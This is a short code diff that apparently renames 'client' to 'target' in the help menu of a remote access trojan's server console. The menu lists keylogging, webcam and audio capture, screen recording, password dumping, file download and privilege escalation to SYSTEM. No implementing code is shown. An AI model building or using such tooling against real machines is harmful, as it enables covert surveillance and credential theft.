@@ -111,26 +111,26 @@ def save_webcam(data):
 def show_help():
     help_text = """
 Available commands:
-  capture_screenshot      - Capture a screenshot from the client
-  start_audio             - Start audio recording on the client
-  stop_audio              - Stop audio recording from the client and save the file
-  start_screenrecord      - Start screen recording on the client
-  stop_screenrecord       - Stop screen recording from the client and save the file
-  webcam                  - Capture an image from the webcam
-  start_keylogger         - Start keylogger on the client
-  stop_keylogger          - Stop keylogger on the client and save the logs
-  view_keylog             - View keylogs from the client
-  cd <path>               - Change directory on the client
-  download <path>         - Download a file from the client
+  capture_screenshot      - Capture a screenshot from the target
+  start_audio             - Start audio recording on the target
+  stop_audio              - Stop audio recording from the target and save the file
+  start_screenrecord      - Start screen recording on the target
+  stop_screenrecord       - Stop screen recording from the target and save the file
+  webcam                  - Take a picture from the webcam
+  start_keylogger         - Start keylogger on the target
+  stop_keylogger          - Stop keylogger on the target and save the logs
+  view_keylog             - View keylogs from the target
+  cd <path>               - Change directory on the target
+  download <path>         - Download a file from the target
   clear                   - Clear the server console
   elevate_to_admin        - Elevate privileges from User to Administrator
   elevate_to_system       - Elevate privileges from Administrator to SYSTEM
-  systeminfo              - Get system information from the client
-  lock                    - Lock the client's workstation
-  dump_password           - Dump passwords from the client
-  ls                      - List files in the current directory on the client
-  pwd                     - Print the current working directory on the client
-  whoami                  - Show the current user on the client
+  systeminfo              - Get system information from the target
+  lock                    - Lock the target's workstation
+  dump_password           - Dump passwords from the target
+  ls                      - List files in the current directory on the target
+  pwd                     - Print the current working directory on the target
+  whoami                  - Show the current user on the target
   exit                    - Exit the server console
   help                    - Show this help message
 
